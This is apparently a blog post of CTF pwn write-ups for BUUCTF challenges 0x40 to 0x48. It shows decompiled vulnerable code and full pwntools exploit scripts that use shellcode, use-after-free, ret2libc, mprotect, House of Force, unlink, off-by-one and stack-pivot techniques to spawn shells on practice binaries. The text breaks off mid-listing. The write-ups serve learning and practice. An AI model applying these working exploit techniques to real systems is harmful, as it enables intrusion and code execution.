---
title: BUU_PWN刷题_0x40-0x4F
date: 2021-10-17
tags: PWN
categories: Technology
---

[TOC]

# 0x40.ciscn_2019_s_9

看下检查,全没开

```shell
yutao@ubuntu:~/Desktop$ checksec ./ciscn_s_9
[*] '/home/yutao/Desktop/ciscn_s_9'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

```c
int pwn()
{
  char s[24]; // [esp+8h] [ebp-20h] BYREF

  puts("\nHey! ^_^");
  puts("\nIt's nice to meet you");
  puts("\nDo you have anything to tell?");
  puts(">");
  fflush(stdout);
  fgets(s, 50, stdin);
  puts("OK bye~");
  fflush(stdout);
  return 1;
}
```

有可用的gadget：

```assembly
.text:08048551 hint            proc near
.text:08048551 ; __unwind {
.text:08048551                 push    ebp
.text:08048552                 mov     ebp, esp
.text:08048554                 jmp     esp
.text:08048554 hint            endp
```

直接写shellcode的话会太长，那么需要找一些短的shellcode(或者手写)，之后的ret覆写为jmp的那个gadget，后面还需要提升堆栈。

```python
from pwn import *
context(log_level = "debug",arch='i386',os='linux')
#io = process("./ciscn_s_9")

io = remote("node4.buuoj.cn",29087)
jump_esp=0x8048554
shellcode='''
xor eax,eax
xor edx,edx
push edx
push 0x68732f2f
push 0x6e69622f
mov ebx,esp
xor ecx,ecx
mov al,0xB
int 0x80
'''
shell = asm(shellcode)
payload = shell.ljust(0x24,'a')+p32(jump_esp)
payload+=asm("sub esp,40;call esp;")
io.sendline(payload)
io.interactive()
```

# 0x41.pwnable_hacknote

没开PIE

```shell
gwt@ubuntu:~/Desktop$ checksec  hacknote 
[*] '/home/gwt/Desktop/hacknote'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

UAF，之前好像做过

```c
unsigned int add()
{
  void **v0; // ebx
  int i; // [esp+Ch] [ebp-1Ch]
  int size; // [esp+10h] [ebp-18h]
  char buf[8]; // [esp+14h] [ebp-14h] BYREF
  unsigned int v5; // [esp+1Ch] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  if ( chunk_number <= 5 )
  {
    for ( i = 0; i <= 4; ++i )
    {
      if ( !(&ptr)[i] )
      {
        (&ptr)[i] = malloc(8u);
        if ( !(&ptr)[i] )
        {
          puts("Alloca Error");
          exit(-1);
        }
        *(&ptr)[i] = puts_0;//puts的地址
        printf("Note size :");
        read(0, buf, 8u);
        size = atoi(buf);
        v0 = (&ptr)[i];
        v0[1] = malloc(size);
        if ( !(&ptr)[i][1] )
        {
          puts("Alloca Error");
          exit(-1);
        }
        printf("Content :");
        read(0, (&ptr)[i][1], size);
        puts("Success !");
        ++chunk_number;
        return __readgsdword(0x14u) ^ v5;
      }
    }
  }
  else
  {
    puts("Full");
  }
  return __readgsdword(0x14u) ^ v5;
}
```

```c
unsigned int delete()
{
  int v1; // [esp+4h] [ebp-14h]
  char buf[4]; // [esp+8h] [ebp-10h] BYREF
  unsigned int v3; // [esp+Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Index :");
  read(0, buf, 4u);
  v1 = atoi(buf);
  if ( v1 < 0 || v1 >= chunk_number )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( (&ptr)[v1] )
  {
    free((&ptr)[v1][1]);
    free((&ptr)[v1]);
    puts("Success");
  }
  return __readgsdword(0x14u) ^ v3;
}
```

```c
unsigned int print()
{
  int v1; // [esp+4h] [ebp-14h]
  char buf[4]; // [esp+8h] [ebp-10h] BYREF
  unsigned int v3; // [esp+Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Index :");
  read(0, buf, 4u);
  v1 = atoi(buf);
  if ( v1 < 0 || v1 >= chunk_number )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( (&ptr)[v1] )
    (*(&ptr)[v1])((&ptr)[v1]);
  return __readgsdword(0x14u) ^ v3;
}
```

free后没清空，有UAF

exp:

```python
from pwn import *
context.log_level='debug'
# io = process('./hacknote')
io = remote('node4.buuoj.cn',26602)
elf = ELF('./hacknote')
libc = ELF('./libc-2.23.so')
# libc = ELF('/lib/i386-linux-gnu/libc.so.6')

def add_note(size,content):
    io.recvuntil('Your choice :')
    io.sendline('1')
    io.recvuntil('Note size :')
    io.sendline(str(size))
    io.recvuntil('Content :')
    io.send(content)

def delete_note(index):
    io.recvuntil('Your choice :')
    io.sendline('2')
    io.recvuntil('Index :')
    io.sendline(str(index))

def print_note(index):
    io.recvuntil('Your choice :')
    io.sendline('3')
    io.recvuntil('Index :')
    io.sendline(str(index))

add_note(0x20,'aaaaaaa')
add_note(0x20,'aaaaaa')

delete_note(1)
delete_note(0)

payload = p32(0x804862B)+ p32(0x804A018)

add_note(8,payload)
print_note(1)

free_got = u32(io.recv(4))

base = free_got - libc.sym['free']
system = base + libc.sym['system']
bin_sh = base + libc.search('/bin/sh').next()
delete_note(2)

payload = p32(system)+';sh\x00'

add_note(8,payload)
print_note(1)
io.interactive()
```

# 0x42.jarvisoj_level5

先看保护：

```shell
gwt@ubuntu:~/Desktop$ checksec level3_x64 
[*] '/home/gwt/Desktop/level3_x64'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

```c
ssize_t vulnerable_function()
{
  char buf[128]; // [rsp+0h] [rbp-80h] BYREF

  write(1, "Input:\n", 7uLL);
  return read(0, buf, 0x200uLL);
}
```

解法一：ret2libc

```python
from pwn import *

context(log_level='debug')
# io = process("./level3_x64")
io = remote("node4.buuoj.cn",26861)

elf = ELF('./level3_x64')
libc = ELF('./libc-x64-2.23.so')
# libc = ELF('/lib/x86_64-linux-gnu/libdl.so.2')
pop_rdi_ret = 0x04006b3
pop_rsi_r15_ret = 0x00004006b1 
main_addr = elf.sym['main']
write_got = elf.got['write']
write_plt = elf.plt['write']
payload = 'a'*0x88+p64(pop_rdi_ret)+p64(1)+p64(pop_rsi_r15_ret)+p64(write_got)+p64(8)+p64(write_plt)+p64(main_addr)

io.recvuntil('\n')
io.send(payload)
# io.recv(8)
write_addr = u64(io.recv(8))
print hex(write_addr)
libc_base = write_addr - libc.sym['write']
system = libc_base + libc.sym['system']
bin_sh = libc_base+ libc.search('/bin/sh').next()


payload = 'a'*0x88+p64(pop_rdi_ret)+p64(bin_sh)+p64(system)+p64(main_addr)+p64(1)
io.recv()
io.sendline(payload)
io.interactive()
```

解法二：mprotect

```python
from pwn import *
p = remote("node4.buuoj.cn",26861)
#p = process("./level3_x64")
elf = ELF("./level3_x64")
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF('./libc-x64-2.23.so')
context(arch='amd64', os='linux',word_size='64',log_level='debug')
shellcode = asm(shellcraft.sh())

pop_rdi = 0x4006b3
pop_rsi_r15_ret = 0x4006b1
 
payload = 0x88 * 'a' + p64(pop_rsi_r15_ret) + p64(elf.got["write"]) + p64(0) + p64(pop_rdi) + p64(1) + p64(elf.symbols["write"]) + p64(elf.symbols["main"])
p.recv()
p.sendline(payload)
write_addr = u64(p.recv(8))
libc_base = write_addr - libc.symbols["write"]
mprotect_addr = libc_base + libc.symbols["mprotect"]
########### read shell code to bss
payload = 0x88 * 'a' + p64(pop_rdi) + p64(0) + p64(pop_rsi_r15_ret) + p64(elf.bss()) + p64(0) + p64(elf.symbols["read"]) + p64(elf.symbols["main"])
p.recv()
p.sendline(payload)
p.sendline(shellcode)

###########write bss to got table
bss_got = 0x600A48
payload = 0x88 * 'a' + p64(pop_rdi) + p64(0) + p64(pop_rsi_r15_ret) + p64(bss_got) + p64(0) + p64(elf.symbols["read"]) + p64(elf.symbols["main"])
p.recv()
p.send(payload)
p.send(p64(elf.bss()))

 
###########write mprotect to got table
mprotect_got = 0x600A50
payload = 0x88 * 'a' + p64(pop_rdi) + p64(0) + p64(pop_rsi_r15_ret) + p64(mprotect_got) + p64(0) + p64(elf.symbols["read"]) + p64(elf.symbols["main"])
p.recv()
p.send(payload)
p.send(p64(mprotect_addr))
 
 
payload = 0x88 * 'a' + p64(0x4006A6) + "ret_addr" + p64(0) + p64(1) + p64(mprotect_got) + p64(7) +p64(0x1000)+p64(0x600000)
payload += p64(0x400690)
payload += "ret_addr" + p64(0) + p64(1) + p64(bss_got) + p64(0) + p64(0) + p64(0)
payload += p64(0x400690)
p.recv()
p.send(payload)
 
p.interactive()
```



# 0x43.picoctf_2018_shellcode

```shell
yutao@ubuntu:~/Desktop$ checksec PicoCTF_2018_shellcode
[*] '/home/yutao/Desktop/PicoCTF_2018_shellcode'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

主函数：

```assembly
.text:080488A1 ; int __cdecl main(int argc, const char **argv, const char **envp)
.text:080488A1                 public main
.text:080488A1 main            proc near               ; DATA XREF: _start+17↑o
.text:080488A1
.text:080488A1 var_A0          = byte ptr -0A0h
.text:080488A1 var_C           = dword ptr -0Ch
.text:080488A1 var_4           = dword ptr -4
.text:080488A1 argc            = dword ptr  8
.text:080488A1 argv            = dword ptr  0Ch
.text:080488A1 envp            = dword ptr  10h
.text:080488A1
.text:080488A1 ; __unwind {
.text:080488A1                 lea     ecx, [esp+4]
.text:080488A5                 and     esp, 0FFFFFFF0h
.text:080488A8                 push    dword ptr [ecx-4]
.text:080488AB                 push    ebp
.text:080488AC                 mov     ebp, esp
.text:080488AE                 push    ecx
.text:080488AF                 sub     esp, 0A4h
.text:080488B5                 mov     eax, stdout
.text:080488BA                 push    0
.text:080488BC                 push    2
.text:080488BE                 push    0
.text:080488C0                 push    eax
.text:080488C1                 call    setvbuf
.text:080488C6                 add     esp, 10h
.text:080488C9                 call    getegid
.text:080488CE                 mov     [ebp+var_C], eax
.text:080488D1                 sub     esp, 4
.text:080488D4                 push    [ebp+var_C]
.text:080488D7                 push    [ebp+var_C]
.text:080488DA                 push    [ebp+var_C]
.text:080488DD                 call    setresgid
.text:080488E2                 add     esp, 10h
.text:080488E5                 sub     esp, 0Ch
.text:080488E8                 push    offset aEnterAString ; "Enter a string!"
.text:080488ED                 call    puts
.text:080488F2                 add     esp, 10h
.text:080488F5                 sub     esp, 0Ch
.text:080488F8                 lea     eax, [ebp+var_A0]
.text:080488FE                 push    eax
.text:080488FF                 call    vuln
.text:08048904                 add     esp, 10h
.text:08048907                 sub     esp, 0Ch
.text:0804890A                 push    offset aThanksExecutin ; "Thanks! Executing now..."
.text:0804890F                 call    puts
.text:08048914                 add     esp, 10h
.text:08048917                 lea     eax, [ebp+var_A0]
.text:0804891D                 call    eax <==这里有问题
.text:0804891F                 mov     eax, 0
.text:08048924                 mov     ecx, [ebp+var_4]
.text:08048927                 leave
.text:08048928                 lea     esp, [ecx-4]
.text:0804892B                 retn
.text:0804892B ; } // starts at 80488A1
.text:0804892B main            endp
```

可以知道一个是vuln那里，还有一个是call eax那里有点可疑。

```assembly
.text:0804887C                 public vuln
.text:0804887C vuln            proc near               ; CODE XREF: main+5E↓p
.text:0804887C
.text:0804887C arg_0           = dword ptr  8
.text:0804887C
.text:0804887C ; __unwind {
.text:0804887C                 push    ebp
.text:0804887D                 mov     ebp, esp
.text:0804887F                 sub     esp, 8
.text:08048882                 sub     esp, 0Ch
.text:08048885                 push    [ebp+arg_0]
.text:08048888                 call    gets
.text:0804888D                 add     esp, 10h
.text:08048890                 sub     esp, 0Ch
.text:08048893                 push    [ebp+arg_0]
.text:08048896                 call    puts
.text:0804889B                 add     esp, 10h
.text:0804889E                 nop
.text:0804889F                 leave
.text:080488A0                 retn
.text:080488A0 ; } // starts at 804887C
.text:080488A0 vuln            endp
```

调用vuln的时候课看出来是只有一个参数`var_A0`，vuln中调用gets后写入到`var_A0`中，之后直接call`var_A0`的地址，so：

```python
from pwn import *
context(log_level = "debug",arch='i386',os='linux')
# io = process("./PicoCTF_2018_shellcode")
io = remote("node4.buuoj.cn",27093)
payload = asm(shellcraft.sh())
io.sendline(payload)
io.interactive()
```

# 0x44.hitcontraining_bamboobox



```shell
gwt@ubuntu:~/Desktop$ checksec bamboobox 
[*] '/home/gwt/Desktop/bamboobox'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

main：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  void (**v4)(void); // [rsp+8h] [rbp-18h]
  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v6; // [rsp+18h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  v4 = malloc(0x10uLL);
  *v4 = hello_message;
  v4[1] = goodbye_message;
  (*v4)();
  while ( 1 )
  {
    menu();
    read(0, buf, 8uLL);
    switch ( atoi(buf) )
    {
      case 1:
        show_item();
        break;
      case 2:
        add_item();
        break;
      case 3:
        change_item();
        break;
      case 4:
        remove_item();
        break;
      case 5:
        v4[1]();
        exit(0);
      default:
        puts("invaild choice!!!");
        break;
    }
  }
}
```

show_item：

```c
int show_item()
{
  int i; // [rsp+Ch] [rbp-4h]

  if ( !num )
    return puts("No item in the box");
  for ( i = 0; i <= 99; ++i )
  {
    if ( *(&malloc_addr + 2 * i) )
      printf("%d : %s", i, *(&malloc_addr + 2 * i));
  }
  return puts(byte_401089);
}
```

add：

```c
__int64 add_item()
{
  int i; // [rsp+4h] [rbp-1Ch]
  int size; // [rsp+8h] [rbp-18h]
  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  if ( num > 99 )
  {
    puts("the box is full");
  }
  else
  {
    printf("Please enter the length of item name:");
    read(0, buf, 8uLL);
    size = atoi(buf);
    if ( !size )
    {
      puts("invaild length");
      return 0LL;
    }
    for ( i = 0; i <= 99; ++i )
    {
      if ( !(&malloc_addr)[2 * i] )
      {
        *(&malloc_size + 4 * i) = size;
        (&malloc_addr)[2 * i] = malloc(size);
        printf("Please enter the name of item:");
        *((&malloc_addr)[2 * i] + read(0, (&malloc_addr)[2 * i], size)) = 0;
        ++num;
        return 0LL;
      }
    }
  }
  return 0LL;
}
```

```c
unsigned __int64 change_item()
{
  int index; // [rsp+4h] [rbp-2Ch]
  int v2; // [rsp+8h] [rbp-28h]
  char buf[16]; // [rsp+10h] [rbp-20h] BYREF
  char nptr[8]; // [rsp+20h] [rbp-10h] BYREF
  unsigned __int64 v5; // [rsp+28h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  if ( num )
  {
    printf("Please enter the index of item:");
    read(0, buf, 8uLL);
    index = atoi(buf);
    if ( (&malloc_addr)[2 * index] )
    {
      printf("Please enter the length of item name:");
      read(0, nptr, 8uLL);
      v2 = atoi(nptr);
      printf("Please enter the new name of the item:");
      *((&malloc_addr)[2 * index] + read(0, (&malloc_addr)[2 * index], v2)) = 0;
    }
    else
    {
      puts("invaild index");
    }
  }
  else
  {
    puts("No item in the box");
  }
  return __readfsqword(0x28u) ^ v5;
}
```

remove：

```c
unsigned __int64 remove_item()
{
  int v1; // [rsp+Ch] [rbp-14h]
  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  if ( num )
  {
    printf("Please enter the index of item:");
    read(0, buf, 8uLL);
    v1 = atoi(buf);
    if ( (&malloc_addr)[2 * v1] )
    {
      free((&malloc_addr)[2 * v1]);
      (&malloc_addr)[2 * v1] = 0LL;
      *(&malloc_size + 4 * v1) = 0;
      puts("remove successful!!");
      --num;
    }
    else
    {
      puts("invaild index");
    }
  }
  else
  {
    puts("No item in the box");
  }
  return __readfsqword(0x28u) ^ v3;
}
```

除此之外，还有个magic：

```c
void __noreturn magic()
{
  int fd; // [rsp+Ch] [rbp-74h]
  char buf[104]; // [rsp+10h] [rbp-70h] BYREF
  unsigned __int64 v2; // [rsp+78h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  fd = open("/home/bamboobox/flag", 0);
  read(fd, buf, 0x64uLL);
  close(fd);
  printf("%s", buf);
  exit(0);
}
```

有两种解法：1.House Of Force，2.unlink

## 1.House Of Force

需要满足两点

1.  能够以溢出等方式控制到 top chunk 的 size 域
2.  能够自由地控制堆分配尺寸的大小

>   往低地址就是两者(low_addr-0x10)-top_addr
>
>   往高地址，就是(high_addr-0x10-top_addr)-0x10

程序中的change并没有对输入的长度进行限制

利用House Of Force覆写程序一开始malloc时写入的goodbye_message

远程没有`/home/bamboobox/flag`这个文件夹，本地可以通：

exp:

```python
from pwn import *

context(log_level='debug')
context.arch = 'amd64'

r = process("./bamboobox")
elf = ELF("./bamboobox")

def alloc(length,context):
    r.recvuntil("Your choice:")
    r.sendline("2")
    r.recvuntil("Please enter the length of item name:")
    r.sendline(str(length))
    r.recvuntil("Please enter the name of item:")
    r.send(context)

def edit(idx,length,context):
    r.recvuntil("Your choice:")
    r.sendline("3")
    r.recvuntil("Please enter the index of item:")
    r.sendline(str(idx))
    r.recvuntil("Please enter the length of item name:")
    r.sendline(str(length))
    r.recvuntil("Please enter the new name of the item:")
    r.send(context)

def free(idx):
    r.recvuntil("Your choice:")
    r.sendline("4")
    r.recvuntil("Please enter the index of item:")
    r.sendline(str(idx))

def show():
    r.sendlineafter("Your choice:", "1")

def exit():
    r.sendlineafter(":", "5")

alloc(0x30,'aaaa')
payload='a'*0x30+p64(0)+p64(0xffffffffffffffff)
edit(0,0x40,payload)

magic=elf.sym['magic']
log.info("magic_addr:0x%x",magic)

# malloc_size = -(0x40 + 0x20)-0x10
malloc_size = 0x1b22000 - 0x10 -0x1b22060
gdb.attach(r)
alloc(malloc_size,'aaaa')
alloc(0x10,p64(magic)*2)
exit()
r.interactive()
```

## 2.unlink

直接看exp：

```python
from pwn import *

context(log_level='debug')
context.arch = 'amd64'

# r = process("./bamboobox")
r = remote("node4.buuoj.cn",25477)
elf = ELF("./bamboobox")
libc = ELF("./libc-x64-2.23.so")
def alloc(length,context):
    r.recvuntil("Your choice:")
    r.sendline("2")
    r.recvuntil("Please enter the length of item name:")
    r.sendline(str(length))
    r.recvuntil("Please enter the name of item:")
    r.send(context)

def edit(idx,length,context):
    r.recvuntil("Your choice:")
    r.sendline("3")
    r.recvuntil("Please enter the index of item:")
    r.sendline(str(idx))
    r.recvuntil("Please enter the length of item name:")
    r.sendline(str(length))
    r.recvuntil("Please enter the new name of the item:")
    r.send(context)

def free(idx):
    r.recvuntil("Your choice:")
    r.sendline("4")
    r.recvuntil("Please enter the index of item:")
    r.sendline(str(idx))

def show():
    r.sendlineafter("Your choice:", "1")

def exit():
    r.sendlineafter(":", "5")

alloc(0x30,'bbbb')#0
alloc(0x30,'bbbb')#1
alloc(0x80,'cccc')
alloc(0x20,'/bin/sh\x00')

glo=0x6020c8+0x10#
fd=glo-0x18
bk=glo-0x10

payload=p64(0)+p64(0x31)+p64(fd)+p64(bk)+'a'*0x10+p64(0x30)+p64(0x90)
#这里p64(0x30)+p64(0x90)，所以后面free的时候会合并
#之后chunk1就是伪造的那个chunk了
edit(1,len(payload),payload)
free(2)
# gdb.attach(r)
free_got=elf.got['free']
payload1=p64(0)+p64(0)+p64(0x30)+p64(free_got)
edit(1,len(payload1),payload1)
show()
free_addr=u64(r.recvuntil("\x7f")[-6: ].ljust(8, '\x00')) 
libc_base=free_addr-libc.sym['free']
system_addr=libc_base+libc.sym['system']
edit(1,0x8,p64(system_addr))
#将free改为system
free(3)
r.interactive()
```

# 0x45.npuctf_2020_easyheap



```c
unsigned __int64 create()
{
  __int64 *v0; // rbx
  int i; // [rsp+4h] [rbp-2Ch]
  __int64 size; // [rsp+8h] [rbp-28h]
  char buf[8]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v5; // [rsp+18h] [rbp-18h]

  v5 = __readfsqword(0x28u);
  for ( i = 0; i <= 9; ++i )
  {
    if ( !(&heaparray)[i] )
    {
      (&heaparray)[i] = malloc(0x10uLL);
      if ( !(&heaparray)[i] )
      {
        puts("Allocate Error");
        exit(1);
      }
      printf("Size of Heap(0x10 or 0x20 only) : ");
      read(0, buf, 8uLL);
      size = atoi(buf);
      if ( size != 0x18 && size != 0x38 )
        exit(-1);
      v0 = (&heaparray)[i];
      v0[1] = malloc(size);
      if ( !(&heaparray)[i][1] )
      {
        puts("Allocate Error");
        exit(2);
      }
      *(&heaparray)[i] = size;
      printf("Content:");
      read_input((&heaparray)[i][1], size);
      puts("Done!");
      return __readfsqword(0x28u) ^ v5;
    }
  }
  return __readfsqword(0x28u) ^ v5;
}
```

edit有off by one 

```c
unsigned __int64 edit()
{
  int v1; // [rsp+0h] [rbp-10h]
  char buf[4]; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v3; // [rsp+8h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Index :");
  read(0, buf, 4uLL);
  v1 = atoi(buf);
  if ( v1 < 0 || v1 > 9 )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( (&heaparray)[v1] )
  {
    printf("Content: ");
    read_input((&heaparray)[v1][1], *(&heaparray)[v1] + 1);
    puts("Done!");
  }
  else
  {
    puts("How Dare you!");
  }
  return __readfsqword(0x28u) ^ v3;
}
```

delete没有什么问题：

```c
unsigned __int64 delete()
{
  int v1; // [rsp+0h] [rbp-10h]
  char buf[4]; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v3; // [rsp+8h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Index :");
  read(0, buf, 4uLL);
  v1 = atoi(buf);
  if ( v1 < 0 || v1 > 9 )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( (&heaparray)[v1] )
  {
    free((&heaparray)[v1][1]);
    free((&heaparray)[v1]);
    (&heaparray)[v1] = 0LL;
    puts("Done !");
  }
  else
  {
    puts("How Dare you!");
  }
  return __readfsqword(0x28u) ^ v3;
}
```

之前有类似的，chunk overlapping。

因为输入菜单后执行的是atoi所以将atoi改为了system

```python
from pwn import *
context(log_level = "debug")
# io = process("./npuctf_2020_easyheap")
io = remote("node4.buuoj.cn", 28803)
elf = ELF("./npuctf_2020_easyheap")
libc = ELF('./libc-x64-2.27.so')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def create(size,payload):
	io.sendafter('choice :','1')
	io.recvuntil('only) : ')
	io.sendline(str(size))
	io.sendlineafter('Content:',payload)

def edit(index,payload):
	io.sendafter('choice :','2')
	io.recvuntil('Index :')
	io.send(str(index))
	io.sendafter('Content:',payload)

def show(index):
	io.sendlineafter('choice :','3')
	io.recvuntil('Index :')
	io.sendline(str(index))

def delete(index):
	io.sendafter('choice :','4')
	io.recvuntil('Index :')
	io.sendline(str(index))


create(0x18,'aaaaaaa')
create(0x18,'bbbbbbb')
payload = 'a'*0x18+'\x41'
edit(0,payload)
delete(1)

payload = 'a'*0x18+p64(0x21)+p64(8)+p64(elf.got['atoi'])
create(0x38,payload)
show(1)
io.recvuntil('Content : ')
# a = u64(io.recvuntil("\x7f").ljust(8, '\x00'))
print_addr =  u64(io.recvuntil("\x7f").ljust(8,'\x00'))
base = print_addr - libc.sym['atoi']
system_addr = base+ libc.sym['system']

edit(1,p64(system_addr))
io.sendline('/bin/sh\x00')

io.interactive()
```

# 0x46.cmcc_pwnme2

```shell
gwt@ubuntu:~/Desktop$ checksec pwnme2
[*] '/home/gwt/Desktop/pwnme2'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

首先是main和userfunction：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[132]; // [esp+0h] [ebp-88h] BYREF

  string = 0;
  fflush(stdout);
  puts("Welcome");
  puts("Please input:");
  fflush(stdout);
  gets(s);
  userfunction(s);
  return 0;
}
int __cdecl userfunction(char *src)
{
  char dest[108]; // [esp+Ch] [ebp-6Ch] BYREF

  strcpy(dest, src);
  return printf("Hello, %s\n", src);
}
```

其中s为0x84，而desc只有0x6c可以覆盖，并且会将src的地址打印出来

除此之外还有三个函数：

```c
char *__cdecl add_flag(int a1, int a2)
{
  char *result; // eax

  if ( a1 == 0xCAFEBABE && a2 == 0xABADF00D )
  {
    result = (strlen(&string) + 0x804A060);
    strcpy(result, "/.flag1");
  }
  return result;
}
char *__cdecl add_home(int a1)
{
  char *result; // eax

  if ( a1 == 0xDEADBEEF )
  {
    result = (strlen(&string) + 0x804A060);
    strcpy(result, "/home");
  }
  return result;
}
int exec_string()
{
  char s; // [esp+Bh] [ebp-Dh] BYREF
  FILE *stream; // [esp+Ch] [ebp-Ch]

  stream = fopen(&string, "r");
  if ( !stream )
    perror("Wrong file");
  fgets(&s, 50, stream);
  puts(&s);
  fflush(stdout);
  return fclose(stream);
}
```

怎么说呢，一般情况下这几个函数就够了，payload这样构造：

`payload = 'a'*(0x6c+4)+p32(add_home)+p32(pop)+p32(0xdeadbeef)+p32(add_flag)+p32(pop_pop)+p32(0xCAFEBABE)+p32(0xABADF00D)+p32(exec_string)`

但是buu的平台都懂的，flag只在根目录下，so：

exp：

```python
from pwn import *

# io = process("./pwnme2")
io = remote("node4.buuoj.cn",26032)
elf = ELF("./pwnme2")

gets = elf.sym['gets']
exec_string = 0x080485CB 
string = 0x0804A060
payload = (0x6c+4)*'a' + p32(gets) + p32(exec_string)+p32(string)


io.sendline(payload)
io.recv()
io.sendline('flag')

io.interactive()
```

正常exp：

```python
from pwn import *

io = process("./pwnme2")
# io = remote("node4.buuoj.cn",26032)
elf = ELF("./pwnme2")

gets = elf.sym['gets']
exec_string = 0x080485CB 
add_home = 0x08048644
add_flag = 0x08048682
pop_ret = 0x08048680

pop_pop_ret = 0x0804867f
string = 0x0804A060
# payload = (0x6c+4)*'a' + p32(gets) + p32(exec_string)+p32(string)
# io.sendline(payload)
# io.recv()
# io.sendline('flag')


payload = (0x6c+4)*'a' + p32(add_home)+p32(pop_ret)+ p32(0xDEADBEEF)+p32(add_flag)+p32(pop_pop_ret)+p32(0xCAFEBABE)+p32(0xABADF00D) + p32(exec_string)
io.sendline(payload)
io.interactive()
```

# 0x47.actf_2019_babystack

```sh
yutao@ubuntu:~/Desktop$ checksec ACTF_2019_babystack
[*] '/home/yutao/Desktop/ACTF_2019_babystack'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```

观察到：

```assembly
.text:00000000004009C1 loc_4009C1:                             ; CODE XREF: main+B8↑j
.text:00000000004009C1                 lea     rax, [rbp+s]
.text:00000000004009C8                 mov     rsi, rax
.text:00000000004009CB                 mov     edi, offset format ; "Your message will be saved at %p\n"
.text:00000000004009D0                 mov     eax, 0
.text:00000000004009D5                 call    _printf
.text:00000000004009DA                 mov     edi, offset aWhatIsTheConte ; "What is the content of your message?"
.text:00000000004009DF                 call    _puts
.text:00000000004009E4                 mov     edi, 3Eh ; '>'  ; c
.text:00000000004009E9                 call    _putchar
.text:00000000004009EE                 mov     rdx, cs:nbytes  ; nbytes
.text:00000000004009F5                 lea     rax, [rbp+s]
.text:00000000004009FC                 mov     rsi, rax        ; buf
.text:00000000004009FF                 mov     edi, 0          ; fd
.text:0000000000400A04                 call    _read
.text:0000000000400A09                 mov     edi, offset aByebye ; "Byebye~"
.text:0000000000400A0E                 call    _puts
.text:0000000000400A13                 mov     eax, 0
.text:0000000000400A18
.text:0000000000400A18 locret_400A18:                          ; CODE XREF: main+C9↑j
.text:0000000000400A18                 leave
.text:0000000000400A19                 retn
```

可以就进行栈迁移

exp:

```python
from pwn import *

context(log_level = "debug")
# io = process("./ACTF_2019_babystack")
io = remote("node4.buuoj.cn",26812)

elf = ELF("./ACTF_2019_babystack")
libc = ELF("./libc-x64-2.27.so")
# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
main_addr = 0x04008F6 
leave_ret = 0x0400a18
pop_rdi_ret = 0x0400ad3
ret = 0x400a4f
io.recvuntil(">")

io.sendline('224')
io.recvuntil("at ")
stack_addr = int(io.recvuntil('\n',drop=True),16)

payload = 'a'*8 + p64(pop_rdi_ret)+p64(elf.got['puts'])+p64(elf.plt['puts'])+p64(main_addr)
payload += (0xd0-len(payload))*'a' + p64(stack_addr)+p64(leave_ret)

io.recvline()
io.recvuntil(">")
io.send(payload)
io.recvuntil("Byebye~\n")

puts_addr = u64(io.recvuntil('\x7f').ljust(8,'\x00'))
print hex(puts_addr)

base = puts_addr - libc.sym['puts']
system_addr = base+libc.sym['system']
bin_sh = base + libc.search('/bin/sh').next()

io.recvuntil(">")

io.sendline('224')
io.recvuntil("at ")
stack_addr = int(io.recvuntil('\n',drop=True),16)
io.recv()

payload = 'a'*8+p64(ret)+p64(pop_rdi_ret)+p64(bin_sh)+p64(system_addr)
payload += (0xd0-len(payload))*'a' + p64(stack_addr)+p64(leave_ret)

io.sendline(payload)

io.interactive()
```

# 0x48.picoctf_2018_got_shell

```sh
yutao@ubuntu:~/Desktop$ checksec ./PicoCTF_2018_got-shell
[*] '/home/yutao/Desktop/PicoCTF_2018_got-shell'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  _DWORD *v3; // [esp+14h] [ebp-114h] BYREF
  int v4; // [esp+18h] [ebp-110h] BYREF
  char s[256]; // [esp+1Ch] [ebp-10Ch] BYREF
